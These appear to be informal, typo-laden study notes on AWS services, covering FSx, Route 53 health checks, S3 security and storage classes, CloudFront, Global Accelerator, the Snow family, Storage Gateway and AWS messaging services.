+ It supports SMB protocol and windows NFTS
+ It supports Microsoft AD, ACL and user quotos
+ It can be mounted on a linux ec2 instance, windows and MacOS
+ Can scale this file system up to 10s of GB
+ You connect it to your on-premise network using a VPN or Direct Connect
+ It is highly available because you can configure to be in different AZs
+ Data can be back uped to S3 buckets
2. **FSx for Lustre**
- The name lustre comes from the linux - word `cluster`
This is fully managed system that is optimized for high performance comouting, machine learning and media processing workloads. It can handle large amount of data processing workloads.
+ It can scale up to 100s GBS/S, millions IOPS
+ It has different storage options (SDD, HDD)
+ You can intergrate or connect with it S3
+ You can connect it to your premise network using a VPN or Direct Connect
3. **FSx for NetApp ONTAP**
This service provides a managed NetApp ONTAP file system with full suppport for the ONTAP data mgt feature
+ Supports NFS, SMB & ISCSI
+ It is good for enterprise applications, databases and storage for VM(ec2 instances)
+ It works with the follwing OS: Linux, Windows, MacOS, EC2, EKS, ECS, VMCLOUD on AWS
+ Can shrink storage or it can grow the storage automatically
+ You can create Snapshots, replicate data, low cost, compression and data de-duplication
`Use Case`: Disaster Recovery, BackUp, Virtualization
4. **FSx for OpenZFS**
This service provides a managed file system that provides high performance and rich



ROUTE 53 



OCT 14, 2025
**Health Check in Route 53**
Route 53 provides health checks to monitor the health and performance of your resources. Health check helps Route 53 to determine if an available resource is available and performing normally, allowing users to use this info* to setup failovers and routing policies based on the information.
+ These Route 53 health checkers operate outside of your VPC, so they cannot directly access private resources (like internal EC2 instance, private ALPs or endpoints within a Private Hosted Zone.)
`The work around`
- Set up a CloudWatch Alarm
- Set Cloud Watch alarm that changes to alarm state when the metric indicates a problem.
- Create a Route 53 health check that monitors the Clould Watch alarm instead of the endpoint directly.

**Types of health checks in Route 53**
1. `EndPoint Health Check`
2. `Calculated Health Checks (Status of other health checks)`: It evalautes the health of a resource based on the results of other health checks or multiple health checks. `(Up to 257)`.
- You have the option to set when the parent health check can be can be deemed healthy.
3. `State of CloudWatch alarm Health Checks`: This uses Cloudwatch alarm(A monioring tool in aws) to determine the health of your resources.



OCT 16th, 2025.
===========================================================================================================================
                                        **S3 BUCKETS(Simple Storage Service)**      
===========================================================================================================================
S3 is a container for storing data. It stands for Simple Storage Service.
Amazon S3 buckets is a storage service provided by amazon which offers storage of different kinds of data and files.

**Some xtics of S3 buckets include**
- Scalability
- Reliability and Security
- Durability
- Version Control

**Use Cases for S3 Buckets**
+ `BackUp and Recovery`: It can be used to backup data which can be used for disaster recovery.
+ `Data Storage`: Can store any amount of data.
+ `Static Web Hosting`: S3 buckets can host HTML, CSS, JS and other web files. Can be intergrated with other AWS services such as Route 53, Cloudfront Distribution (CDN)
+ `Software Delivery or File Distribution`
+ `Data Migration`: It can help you migrate data from premise to the cloud and vice versa.
+ `Archiving Data`: S3 buckets has a Glacier which provides cost effective archiving solutions for daata that needs to be reatined for complaince and long term access.
+ `Versioning`: Can store and replicate different versions of data to serve different purposes.

**Amazon S3 Security**
1. `User Base Security Amazon S3`
    This is how ce control user access to S3 resources within our aws account.
    We will manage user authorization using `IAM policies`(AWS managed policies, Customer policies, Inline Policies)
    We grant access both at the bucket level and object level
    You can enable MFA for user trying to access your S3 bucket through the console.
    You can enable MFA for users trying to delete objects or turn off versioning on your S3 buckets.
2. `Resource Base Security`
    This focuses on securing your S3 bucket and the objects in the bucket.
    + *Bucket Policies*: This is a json based policy that controls wc resources can have access to your s3 buckets.
    + *ACL (Access Control list)*: We have the `Bucket ACL and Object ACL`. ACL are used for more granular or fine grained control.
        Bucket ACL: Manages permissions for the entire bucket such as read, write access for specific accounts and groups.
        Object ACL: Manages permisions for individual objects in the bucket.
    + Bucket and Object Encryption

**How to create a static website in an S3 bucket**
+ First enable public access to your s3 bucket.
+ Create an html file called index.html on your local desktop.
+ Navigate to your s3 bucket and enable static website hosting under properties.
+ Upload the index.html file to the s3 bucket.
+ Update bucket policy to allow access to all or that specific object (index.html)

**Versioning in S3 buckets**
What is Versioning: It is a feature that allows you to maintain multiple versions of existing objects.

`Managing Versions`
+ Each version of an object is assigned a uinique version ID (example version id: `jbsjbHBbj03_f`)
+ Deleting an object with versioning enabled does not actually remove the object, it adds a `delete marker` to indicate that the object is logically deleted.
`To restore the object, delete the delete marker and the object will be restored.`
`Use Case for Versioning in S3 buckets`
+ Helps in maintaning history of changes to objects which is useful for complaince, audit and data recovery purposes.
+ Good for security as it prevents accidental deletion and deleted files can easily be recovered.
+ It can be intergrated with lifecycle policies to automate transitions and expirations of object versions.
+ Cost Effective: Multiple versions of objects may affect storage costs, You are charged for tge storage space used by all versions of objects. To minimize costs, set up a lifecycle policy to move old version to low classess and then delete them after a period of time.
`Best Practices`
- Enable versioning only for critical buckets only to prevent accidental data loss.
- Implement MFA delete for added security when deleteing object versions.
- Regurlarly review and manage the object versions to optimize storage costs and increase efficiency.
- Setup a lifecyle policy to delete old objects to reduce costs. 

**Replication in S3 Buckets** 
**(Cross region Replication, Same region Replication and Cross Account Replication)**

1. `Cross Region Replication`: CRR allows you to automatically replicate objects (data in your S3 buckets) across different AWS regions.
    + Automatic replication: Data put into the source bucket and automatically replicated in the destination bucket.
    + Versioning has to be turned on both buckets (Source and destination).
    + Replciation can take some time based on the size and number of objects.
    + You can replicate specific objects based on tags and prefixes.
    + When it comes to object ownership, the destination bucket can have different owners than the source bucket. To replicate existing objects, you will need to use a `Batch Operation Job`.
    + You can replicate existing objects in an s3 bucket prior to setting up the replication process or ignore.

    **Use Cases**
    + Disaster recovery
    + Lower Latency for users accessing data.
    + Migrating data from one region to another during migration processes.
    + Compliance with data residency requirements.
2. `Same Region Replication`: SRR allows you to duplicate objects in another bucket in the same region.
    Similar to CRR but for the regional differences.
3. `Cross Account Replication`: Allows for data replication in buckets located in another account.

**Additional Replication Options**
    - `Replication Time Control (RTC)`
    Replication Time Control replicates 99.99% of new objects within 15 minutes and includes replication metrics. Additional fees will apply. 
    - `Replication metrics`
    With replication metrics, you can monitor the total number and size of objects that are pending replication, and the maximum replication time to the destination Region. You can also view and diagnose replication failures. CloudWatch metrics fees apply. Learn more  or see Amazon CloudWatch pricing 
    - `Delete marker replication`
    Delete markers created by S3 delete operations will be replicated. Delete markers created by lifecycle rules are not replicated.
    - `Replica modification sync`
    Replicate metadata changes made to replicas from the destination bucket to the source bucket. 

**Storage Classes**
1. **Standard Frequent Access (FA)**
    + This is for data objects that are frequently accessed. Has a high availability
2. **Amazon S3 Standard-infrequent Access (IA)**
    + This is for data (objects) thst is less frequently accessed, but requires rapid access when needed.
    + Less expensive when compared to sthe standard storage class.
    + It offers durability as s3 storage classes but at a lower cost and with a retrieval fee will be applied when retrieving the data.
    + It has a slight lower availability and same durability when compared with the standard.
    + It is good for back ups, disaster recovery.
3. **One Zone (IA) Infrequent Access**
    + Similar to the standard infrequent access but data is stored in a single AZ (Data Centre) instead of data being replicated in multiple AZ's.
    + It provides lower storage cost when compared to s3 standard costs.
    + 99.99 % durability.
    + 99.5 % availability.
    - Useful for cost optimization, compliance, secondary back up.
4. **Glacier Instant Retrieval**
    + Formally called s3 standard glacier.
    + Good for data archiving with milisecond retrieval, great for data accessed once a quarter (every 3 months).
    + Good for data with long retention periods.
    + Minimum storage duration is 90 days.
5. **Glacier Felxible Retrieval**
    + Formally known as S3 Glacier, juest like the instant retrieval glacier, it will help you archive your data.
    Less costly
    +  + Minimum storage duration is 90 days..
6. **Glacier Deep Archive**
    + 
    + Lowest cost in S3.
    + + Minimum storage duration is 180 days..
7. **S3 Intelligent-Tiering**
    + Designed to optimized cost automatically and will move data between two access tiers (frequent access and infrequent access)
    + Small monthly monitoring and auto tiering fee, because it monitors your s3 access pattern and moves them to the appriopriate tier.
    + Automatically moves objects between access tiers based on usage.
    + There are no retrieval charges.

**Life Cycle Rule**: This helps you to automatically move objects in your s3 bucket from one storage class to another or to delete them after a specified period.

**S3 event Notifications**
This is a feature in S3 that helps yo send notifications when certain actions take place in your S3 bucket. e.g `put request(Uploads an object into your bucket)`
1. **Event Types**
    + Object creation, removal, restore, ACL
    + Reduced Redundancy storage
    + Replication
    + LifeCycle
2. **Notification Destination**
    + Lambda function
    + SNS Topic: Sends msgs to multiple reciepients or endpoints
    + SQS: Used for queuing messages that will be used or processed by other apps.

**S3 SECURITY**
1. **S3 Encryption**: This is how you secure s3 objects from unauthorized access. It converts plain text or data into an encoded version (ciphertext).(lock data = encryption & unlock = decryption)

    ***Options of Encrypting Data in S3***
    1. ***Server Side Encryption (SSE)***: This is a method of encrypting data at rest within a cloud storage service like amazon s3. This ensures that data stored is secured and protected from unauthorized access.
        ***Types of SSE keys in S3***
        a. `SSE-S3`
            - This is when you decrypt data at rest. You can enable it at the bucket level or object level.
            - This is the default key type that you can use. AWS manages the key for you. This means that aws will encrypt and decrypt automatically using`AES-256` which is a strong block cipher.
        b. `SSE-KMS (Key Mgt Keys)`
            - You can create `customer managed keys` or `aws keys to enhance security`. This gives you more control and ability to audit key usage.
            - Keys are stored and managed in AWS Key Management Service (KMS).
            `Benefits`
                + Provides ability to perform key rotation.
                + Provided Access control using IAM Policies.
                + Provides key usage audit through cloudtrail.
            `Limitations`
                + You may be impacted by KMS limits (Number of keys you can create) but to resolve this you will need to request an increase for the service quotas.
                + To many API calls can be an issue for your KMS (It generates data key API) and also when you download, it calls the cecrypt KMS API.
                + Slightly more expensive than SSE-S3 due to KMS API cost.
            `Use Case`: Auditing, fine-grained access control, compliance and security governance for sensitive workloads such as PHI, PCI.
        c. `Dual Layer Server Side Encryption with AWS KMS (DSSE - KMS)`
            Enhanced encryption option for Amazon S3 that applied 2 independent layers of encryption at rest, both using AWS KMS-managed keys. It is designed for orgs that require higher assurance, defense and more.
    2. ***Client Side Encryption***
    - This is when a client or data (object) is encrypted by the client before upload (put) into a S3 bucket. 
    - You can manage the encryption keys yourself or you can use AWS KMS managed keys through an SDK(Software Dev Kit) that supports client-side encryption. 
    - If you managed your keys, the responsibility for decrypting and encrypting lies with the client(you) as well as key mgt and rotation.
    - AWS stores only the encrypted objects and never has access to the plaintext data or your keys.
    3. ***Encryption in Transit (SSL/TLS)***
    - Encryption in Transit: AWS S3 can encrypt data in transit using HTTPS which uses (SSL/TLS protocols).
    - Amazon S3 exposes two endpoints (HTTP and HTTPS) (http is unsecured while https (secured)).
    - To secure data in motion, S3 supports HTTPS, which uses SSL/TLS protocols to prevent eaves dropping, tampering or man-in-the-middle attacks.
    - By default, most AWS SDKs, the AWS CLI and modern browsers use the HTTPS endpoint by default and you can enforece this using bucket policies.
    - You can enforce HTTPS-only access at the bucket level using an S3 bucket policy to prevent insecure access.


2. **AWS S3 Access Logs**
Aws S3 access logs provide detailed records of requests made to your S3 buckets. These logs can help you monitor and analyze `access patterns, troubleshoot issues, and ensure complaince with security and regulatory requirements.`
    + Useful for audits and forensics.
    + Helps to analyze access patterns.
    + Access logs are stored in another S3 bucket that you specify (known as the target bucket)
    + It is good for audit purposes so you might want to log all access into an s3 bucket.
    + You can analyze the data in the s3 access logs using data analytic tools.
    + The target logging bucket must be in the same aws region.
    **Access Log Format**: 
    Captures vital info such as who accessed the bucket, the bucket owner, from where (browser, etc), Response status
    The Access log entries are recorded in a specific format which includes fields such as:
    + *Bucket Owner*: The AWS account ID of the bucket owner.
    + *Bucket*: The name of the S3 bucket.
    + *Time*: The time the request was made in UTC.
    + *IP Address*: The IP address of the requester.
    + *Requester*: The AWS acc of the requester (if applicable)
    + *Request ID*: The unique ID of the request.
    + *Operation*: The type of operation (e.g GET, PUT, DELETE)
    + *Key*: The object key being accessed.
    + *HTTP Status*: The HTTP response status code (200 ok, 404 error)
    + *Bytes Sent*: The number of byte sent in the response.
    `You can use a service in AWS called Athena to structure the logs in a more readable format`

3. **Amazon S3 - MFA Delete**
Amazon S3 supports MFA Delete, a feature designed to add extra security layer that protects objects from accidental or malicious deletions. When MFA Delete is enabled, certain high risk actions require a second form of verification, usually a one time code from an MFA device (virtual or hardware).
MFA requires the user to provide two forms of authentication before:
    1. `Permanently delete an object`
    2. `Suspend versioning on the bucket`
`Note`
- Only the bucket owner can enable MFA delete on the bucket.
- MFA Delete cannot be enabled on the AWS console.
- Only worked on versioned S3 buclets.
- Cannot be managed via the AWS console - only via AWS CLI or SDK
- Cannot stop one from deleting objects but protects one from PERMANENTLY deletion.

**Prerequisites to set up MFA delet on a bucket**
- Enable versioning on the bucket.
- Enable MFA if not done already.
To run the command, you need the `Bucket name, device arn, profile name`

**Command to set up MFA Delete**
    `Using the AWS CLI`
    The serial number is the number that uniquely identifies the MFA device. For physical MFA devices, this is the unique serial number that's provided with the device. For virtual MFA devices, the serial number is the device ARN. To use the following commands, replace the user input placeholders with your own information.

    The following example enables S3 Versioning and multi-factor authentication (MFA) delete on a bucket for a physical MFA device. For physical MFA devices, in the --mfa parameter, pass a concatenation of the MFA device serial number, a space character, and the value that is displayed on your authentication device.
    
    aws s3api put-bucket-versioning --bucket amzn-s3-demo-bucket1 --versioning-configuration Status=Enabled,MFADelete=Enabled --mfa "SerialNumber 123456"

4. **Amazon S3 Pre-Signed URL**
A pre-signed URL in Amazon S3 allows you to grant temporary access to a specific object in your S3 bucket to anyone who has the URL. This can be useful for allowing users to dwonload or upload files without needing to make them public or share your AWS credentials. You can create a pre-signed url on the aws console and on the command line.

5. **S3 Glacier Vault Lock**
S3 Glacier allows you to enforce compliance controls on the data stored in Glacier vaults. Once a vault lock policy is set, it can be locked and cannot be changed, ensuring that no one can delete or modify data based on the defined retention period and access controls.
    **Compliance Controls**
    - Designed to meet regulatory compliance (such as financial or health care regulations).
    - It enforces write-once-read-many (`WORM`) storage models where data cannot be deleted or modified after it's written (model).
    **Vault Lock Policy**
    This policy define who can delete archives and what actions are allowed. 
**Two Step Process**
    1. Initiate the Vault lock: Specify the lock policy and it enters an in-progress state allowing you to test the policy for a short period.
    2. Lock the Vault: Lock the vault for the specified period until a change can be made.
`Use Cases`: Financial Services, Health Care Data and Legal Docs for audits and litigation purposes.
Can be done on the AWS console or the CMD line.

6. **S3 Object Locks**
A feature in S3 that enables you to store objects in a write-once-read-many model (WORM) state. This prevents objects from being `deleted or over written` for a fixed amount of time.
    **Key Features**
    **Immutability**: Once an object is locked, it cannot be modified or deleted for a specified retention period, making it ideal for regulatory compliance (e.g financial records, legal docs etc)
    **It has two lock Modes**: Governance Mode & Compliance Mode.
        `Governance Mode`: Allows specific users with special permissions to overwrite or delete objects during the retention period.
        `Compliance Mode`: Strictest form of protection, no one including the root user can delete or modify objects untill the retention period expires.
    **Retention Period**: You can set a retention period during which the object is protected. The retention period can be based on regulatory or business requirements such as retained tax docs in Canada for 5 years.
    After the retention period, objects can be deleted or modified unless explicitly locked again.
    **Legal Hold**: Legal holds prevent object deletion similar to a lock but without an expiry date. A legal hold can be applied and removed by authorized users at any time without defining a retention period.

7. **S3 Access Points**
Access points are named network endpoints that are attached to buckets which simplify managing data access at scale in S3. To view a list of your buckets with access points that grant public or cross-account access, go to IAM Access Analyzer for S3.
    + Simplifies Access Mgt
    + Custome Network Settings.
    + We can have dedicated access points url.
    + It supports S3 permissions and policies.
    `Note`
        - Each access point has it's own policy.
        - Has its own unique endpoint for accessing objects
        - It can be public, private or VPC restricted.

8. **S3 CORS - Cross-Origin Resource Sharing** 
This is a feature that allows you to control how your bucket resources are shared across different domains (endpoints) e.g www.team4teachsolutions or google.com
CORS is primarily used when a web application makes a request to an S3 bucket from a different origin (domain) than its own. This is common for web apps that serve static content from S3 or use S3 for file uploads, such as from the browser.
***Origin***: The domain (protocol, host and port) from which the request is coming from (originates). e.g https://web.com
`Cross Origin Requests`: Request made from one domain(origin) to a different doamin(S3 in this case). These request are typically blocked by browsers fior security reasons unless allowed through CORS configurations.

**Enhancing Performance for S3 buckets**
Optimizing performance in Amazon S3 buckets focuses on improving upload speed, download speed, and request efficiency for large datasets, high traffic apps and global users.
1. `Multi-Part Uploading`:(Uploading Large Data Sets)
    + When uploading large files, S3 can upload parts of the same file in parrallel, instead of sending it as one large stream.
    + Splits large files into smaller parts.
    + Retries only failed parts.
2. `Transfer Acceleration`: If users upload data sets from a different continents, enable this feature to route traffic through Cloud front through CloundFront Edge locations(A small data centre closer to a customer that caches info for afster retrieval) for faster uploads. Best for global teams, large media files and Saas Apps.

**Storage Lens**: Storage Lens provides visibility into storage usage and activity trends at the organization or account level, with drill-downs such as AWS Region, Storage Lens groups, or prefixes. Helps to `optimize cost, improve data lifecycle decisions`, and `detect anomalies` such as `unusual access or request spikes`.

You can enable `free metrics` or `advanced metrics(paid)` and can be exported to anothe S3 bucket.
You cannot use the root account IAM user to view the storage Lens. You have to use an IAM user with apprioprate permissions.





# CLOUDFRONT
===========================================================================================================================
                                        **CLOUDFRONT**      
===========================================================================================================================
Amazon CloudFront is a fast content delivery network (CDN) service that securely delivers data, videos, applications, and APIs to customers globally with low latency and high transfer speeds.
It works alongside services like S3 bucket, Amazon EC2 and Route 53 etc.
Cloudfront will help to ensure that users access our apps, data and videoes with:
    + Low latency.
    + Improve performance of apps, content is cached at edge locations.
    + Improve User Xperience
    + Serve Content globally

**Benefits and features**
**Reduce latency**: The CloudFront network has 225+ points of presence (PoPs) that are connected by fully redundant, parallel 100 GbE fiber delivering ultra-low latency performance and high availability to your end users. CloudFront automatically maps network conditions and intelligently routes your user’s traffic when serving up cached or dynamic content.
**Improve security**: Use CloudFront for perimeter protection, traffic encryption, and access controls. AWS Shield Standard defends traffic transmitted through CloudFront from DDoS attacks at no additional charge. For application protection, you can integrate AWS WAF, managed rules, and managed third-party firewall options into CloudFront workloads.
**Cut costs**: Integrated with AWS, using CloudFront consolidates requests and removes data transfer out fees from your AWS origins. CloudFront offers customizable pricing options including simple pay-as-you-go pricing with no upfront fees and the CloudFront Security Savings Bundle that helps save up to an additional 30%.
**Customize delivery**: Serverless compute features enable you to securely run your own code at the AWS CDN edge. Customize your delivery to overcome the unique challenges your business faces, creating your own balance between cost, performance, and security.

**Use cases**
**Deliver fast, secure websites**:Amazon CloudFront delivers your websites to viewers across the globe securely and with high performance. Granular cache configuration controls, built-in capabilities such as Gzip and Brotli compression, and edge compute capabilities speed up delivery while Transport Layer Security (TLS) 1.3 and field-level encryption helps you improve your application security posture.
**Accelerate dynamic content delivery and APIs**:CloudFront moves dynamic web content along the AWS global network infrastructure to accelerate delivery. CloudFront supports Websocket connections and proxy methods. CloudFront optimizes your network path with TLS edge termination and connection keep-alive. Secure your API calls with integrated AWS WAF and AWS Shield protection.
**Stream video live and on-demand**:CloudFront is designed to handle your live and on-demand video workloads. With full AWS and Elemental media services integration, CloudFront provides default mid-tier caching, Origin Shield architecture, and real time monitoring. CloudFront supports multiple streaming formats, including Microsoft Smooth, HLS, HDS, and MPEG-DASH, to any device.
**Distribute software, game patches, and IoT OTA updates**:CloudFront scales automatically as your globally distributed clients download software updates directly from edge locations. CloudFront’s high data transfer rates speed up the delivery of binaries, game patches, Internet of Things (IoT), and over-the-air (OTA) updates - improving your customers experience cost effectively at scale.

***Core Concepts of Cloudfront or Terminologies***
1. **Edge Locations**: An `Edge location` is a data center (Mini Data Centre) that AWS uses to cache copies of content closer to users in specific geographical locations. These are part of AWS's global infrastructure for services like Amazon Cloudfront and AWS global accerlerators.

2. **AWS Cloudfront Origin**: An origin is the location where the original content is stored. This where cloudfront fetches data before distributing it to its global users.
When a user requests content that isn't already cached at the edge, Cloudfront retrieves it from the origin, caches it and then serves it to future users nearby.
***Types of Cloudfront Origins***
    - ***Amazon S3 buckets***: Commonly used for hosting static websites, images and videos or files. Can be combined with `Origin Access Identity` to restric S3 access only to Cloudfront. This secures your bucket from public access.
    - ***EC2 Instance***: Used for dynamic website hosting running on ec2
    - ***Elastic Load Balancer***: Perfect for high availability apps that run across multiple ec2 instances. Cloudfront connests to the load balancer which distributes traffic evenly to back end services.
    - ***Custom HTTP(s) Server or other Cloud Service Platforms***
    - ***API Gateway***: Deliver API endpoints for REST APIs hosted on API Gateway.
    - ***Elemental MediaPackage***: Deliver end-to-end live events or video on demand (VOD).
    - ***VPC origin***: Deliver applications and content hosted within private VPCs, such as EC2 instances and Application Load Balancers.
    - ***Other***: Refer to any AWS or non-AWS origin through its publicly resolvable URL.

***Concepts related to Cloudfront Origins***
`Origin Server`
    This the main source where your original content is stored. Could be an S3 bucket, Eec2 or LB or HTTPS backend. When Cloudfront does not find a requested object in the edge cache, it fetches it directly from this origin server.
`Origin Group`
    An origin group helps improve availability and fault tolerance.
    Allows for multiple orgin configurations - typically a primary and a secondary. 
`Origin Access Identity(OAI)`
    The OAI is a special Cloudfront Identity used when the origin is an AWS S3 bucket.
    It ensures that only Cloundfront has access to your S3 bucket not the public. By doing this, your S3 bucket remains private and secure and content is served to users safely on your behalf.

**Other Cloudfront Features***
**Geo Restriction**
Geo Restriction (also called `GeoBlocking`) allows you to control who can access your cloudfront content based on their geographical location.
    + Allow-list(`whitelist`): certain countries where users can access your content.
    + Block-List(`Blacklist`): restrict specific geographical regions from accessing content in the Cloudfront.
**Price Classes**
Cloudfront's Price Classes helps you control costs by limiting which edge locations your content will be served from.
    - `Price class All`: All regions - all edge locations own by AWS. --> Best performance but Costly.
    - `Price Class 200`: Most regions but it will exclude the most expensive regions. --> Good balance of cost and reach.
    - `Price Class 100`: least expensive region. --> but limited coverage.
**Cache Invalidations (TTL**)
Cloudfront caches content at edge locations for a specific period known as `Time to Live(TTL)` based on your cache policy.
Sometines, you might update your origin (for example, a new version of your website or static files in S3), and you want Cloudfront to serve the updated changes.
- You can do the invalidation using the `aws console` or the `command line`. See AWS guidelines for steps.

Lab - Hands on Practice for S3 bucket as origin
1. Create Origin: set up S3 bucket and upload static website file
`NB: You do not need to enable static website hosting for s3 bucket because it does not support HTTPs endpoint request`
2. Create an Origin Access Control (OAC).
3. Create Cloudfront distribution: Select Single Website or App  instead of Multi Tenant Architecture.

**Monitiring in Cloudfront**
- You can use Lamba@edge
- Cloudfront functions

**Security in Cloudfront**
- OAC
- Encryption
- WAF


==========================================================================================================================
                                        **Global Accelerators**      
==========================================================================================================================
AWS Global Accelerator is a service that improves the availability and performance of your applications with local or global users. It provides static IP addresses that act as a fixed entry point to your application endpoints in a single or multiple AWS Regions, and uses the AWS global network to optimize the path from your users to your applications.
Instead of users connecting to your apps over public internet, Global Accelerators routes traffic over the `AWS global private network`, which is faster, more stable and less congested.

**Benefits and Features**
    1. ***Improve global application availability***
    AWS Global Accelerator continually monitors the health of your application endpoints, including Network Load Balancers, Application Load Balancers, EC2 Instances, or Elastic IPs, instantly reacting to changes in their health or configuration.
    2. ***Accelerate your global applications***
    AWS Global Accelerator optimizes the network path, taking advantage of the vast, congestion-free AWS global network. Regardless of where your users are located, AWS Global Accelerator intelligently routes traffic to the endpoint that provides the best application performance.
    3. ***Easily move endpoints***
    AWS Global Accelerator provides you with static IP addresses that are assigned to your accelerator for as long as it exists. This allows you to easily move endpoints between Availability Zones or AWS Regions without needing to update your DNS configuration or change client-facing applications.

**Use Cases**
    1. ***Scale for increased application utilization***
    AWS Global Accelerator lets you associate regional resources, such as load balancers and EC2 instances, to two static IP addresses. You can add or remove endpoints in the AWS Regions, run blue/green deployment, and do A/B tests without needing to update the IP addresses in your client applications, firewalls, and DNS records.
    2. ***Accelerate latency-sensitive applications***
    To improve the user experience, AWS Global Accelerator directs user traffic to the application endpoint nearest to the client, which reduces internet latency and jitter. It routes the traffic to the closest edge location via Anycast, and then to the closest regional endpoint over the AWS global network.
    3. ***Disaster recovery for multi-Region & multi-Availability Zone resiliency***
    You need to rely on your network to always be available. If AWS Global Accelerator detects that your application endpoint in the primary AZ or AWS Region has failed, it instantly begins re-routing traffic to the closest next available endpoint in another AZ or AWS Region.
    4. ***Protect your applications***
    AWS Global Accelerator allows you to add an internal Application Load Balancer or a private EC2 instance as an endpoint. By using AWS Global Accelerator as the single internet-facing access point, you protect your applications running on AWS from distributed denial of service (DDoS) attacks and control how your end users reach your applications.

**Why use Global Accelerators**
- Reduces internet latency.
- Provides static Anycast IPs for apps.
- Automatically routes users to the closest healthy endpoint.
- Improves failover and high availability.

**Anycast IP**
- One IP address is shared by multiple servers or endpoints across the globe or network.
- The same IP is announced in many edge locations
- When a user connects, routing automatically sends them to the nearest and healthiest endpoint.
**Unicast**
- One Ip Address = One Server or endpoint.
- The client connects directly to that single server or endpoint
- if the server is far away -> higher latency
- If server is down -> failover

**Global Accelrator Terminologies**
1. `Endpoint`: An endpoint is the actual target resource inside the region that will recieve the traffic. It could be an `An app Load balancer, Network Load Balancer, EC2 instance ...`
2. `Endpoint Group`: An endpoint group includes endpoints, such as load balancers. Global Accelerator is a global service that supports endpoints in multiple AWS Regions but you must be in the US West (Oregon) Region to create or update accelerators.

`Question`: What are some differences between Cloudfront and Global Accelerators ?


==========================================================================================================================
                                        **Data Migration Transfer**      
==========================================================================================================================
In AWS, it is possible to transfer data from one AWS acc to another, one region to another or from on premise to aws and vice versa.

**SNOW family**
The AWS Snow Family helps customers that need to run operations in austere, non-data center environments, and in locations where there's a lack of consistent network connectivity. The Snow Family, comprised of AWS Snowcone, AWS Snowball, and AWS Snowmobile, offers a number of physical devices and capacity points with built-in computing capabilities.

It refers to a group of tools (virtual or physical) services for `data transfer, edge computing and data migration`.

**Snowcones**
This is the smallest member of the snow family, portable, it is good for edge computing, it has 8TB of storage and it can run edge conmputing workloads using AWS IOT greengrassermand ec2 instances.
    - Compact in size and small to fit in a backpack, suitable for remote and hasrsh environment.
    - Storage Capacity: Up 8TB
    - Secured: Data is encrypted
**SnowBall**
This is a physical stroage device designed for large data transfer and edge computing (stroage and compute optimized).
    - Good for data transfer for large amounts into and out of aws. Good in situations where uploading data manually will be difficult, slow or impractical.
    - Physical device sent by AWS to you. Uploading data is your responsibility and you will sent it back to AWS which will then upload your data to the preffered service you want. e.g S3 bucket
    - Capacity: Comes in different sizes, with options for up to 50 TB allowing for large data sets transfer.
    - Security: Uses straong encryption to keep data safe during transportation.
    - Computing At edge: You can analyse and process data before uploading to the cloud.
**Snowmobile**
Used for extremely large amount of data transfers. It can can transfer exabytes of data. Up to 100 petabytes  of capacity. Highly secured and better than a snowball when it comes to moving large data sets. e.g : media companies.
Encrypted, physically transported with a truck, cost effective and good for large data migration (scientific research).

Within the snowfamily, you can set up preconfigure iot green grass on each device:
IOT(Internet of Things): IOT is a concept that refers to the connection of everyday objects and devices to the internet, allowing them to send and recieve data.

**Storage Gateway**
This is a hybrid cloud storage offered by AWS that provides on premises access to virtulally cloud storage. It helps your app to use aws cloud storage with ease and it supports different interfaces and types of data. It is good for hybrid cloud architecture because it reduces cost and enhances performances in data storage and transfer.

AWS Storage Gateway is a hybrid cloud storage service that connects your on-premises apps to cloud storage. It helps businesses seamlessly intergreate their existing insfrasstructure with AWS cloud for various storage needs.

`Question`: You are moving an app to the cloud but then realize that it would need some restructuring and rearchitecturing. How do you manage such situation.

**Different Types of storage gateways**
***File Gateways***: Provides a way to store files in your s3 buckets through NFS networks.
***Volume Gateways***: Prrovides storage volumes that you can mount as ISCsi devices. You can use it for apps that require low-latency access to data and need to stire data both on=premises and in the cloud.
    - Stored Volume: It allows you to store data asychronously in aws s3 buckets using snapshots.
    - Cached Volume: Your data is stored in an S3 while your premise storage retains frequent accessed data.
***Tape Gateway***: Provides virtual tape infrastructure that is backed up by S3 and glacier allowing you to replace the use of physical tapes with Cloud tape libraries.
`Use Cases`: Data Archiving, Hybrid Cloud storage, content distribution, data mig, backup and disaster recovery.


==========================================================================================================================
                                        **AWS INTERGRATION AND MESSAGING**      
==========================================================================================================================
The goal of this feature is to decouple your app so that they don't depend directly on each other.
There are 2 types of service commuinications: `Synchronous and Asynchronous`
- Synchronous: A service will have to wait on each other in real time e,g : API calls, request response
- Asynchronous: Aservice will have to go through another service to get a response (service don't wait, they use queues) such background tasks or job processing.

AWS has core messaging services such as: `SNS, SQS, Kinesis, Amazon MQ`

1. **SQS: Simple Queue Service**
Fully managed messaging queing service provided by aws enabling decoupling. It allows you to send and recieve messages between distributed systems without lossing data.
**Types of SQS Queues**
***Standard SQS***

2. **SNS: Simple Notification Service**
Allows you to send notifications or msgs to large number of reciepients at the same time using different commuinication protocols. It is primarily used for sending push notifications, email, SMS or msgs to other distributed services like AWS Lambda or SQS.

**Key Concept of SNS**
`Topic`: This is how we want to configure messages will be send
`Message Fanout`
`Publisher`

There are 2 types `FIFO & Standard`

**Features**
- `Supports filtering`: Specify the types of msgs based on certain criteria.
- `Security`:
- `Scalability and redundant`: Ensures high availability and autimatically replicated in multiple AZ

**Use Cases**: Event Notofication, App and Infrastructure Monitoring.

**Kinesis**

2. **Amazon Data Firehose**
This service provides a way to reliably load streaming data into data lakes, data stores and analytic services.
- Similar to ETL(Extract -> Transform -> Load)
- It can capture, transform and load screaming data into other services such s3
- Supports different data formats, conversions, transform , compress.

**Key Features**
- Managed Service
- Data format conversion
- Intergration with services like S3, Redshift and Elastic searcg and splunk
- Support Buffering and Compression to save storage
- It has a shrad where you can can store data

3. **Managed Apache Flink (Kinesis data analytics)**
This service enables you to analyze streaming data in real time using standard SQL. AWS made it in such a way that it is very easy to query or request or look streaming data to gain insight or understand data in real time without being an expert in any programming language.

**Key Use Cases**
- Machine Learning:Stream data for real time predictions and model training.
- Real time Data Analytics:
- Monitoring Website clicks and social media interactions
- Data Ingestion: Ingest large volumes of data from IoT devices, apps and web logs
- Log event and data processing.

4. Amazon MQ
Managed service in AWS that manages the setup, operation and scalling of ActiveMQ or Rabbit message brokers including software failure detection and recovery.
`Use Case`: Suitable for microservice architecture where different comonents communincate asynchronously



==========================================================================================================================
                                        **Monitoring and Observability**      
==========================================================================================================================
- Study Eventbridge



# CLOUD TRAIL
It is an AWS service that records and logs every actions or event that occurs within your AWS environment. It provides a detailed audit trail for your aws resources activities, such as API calls, user actions and changes to services.
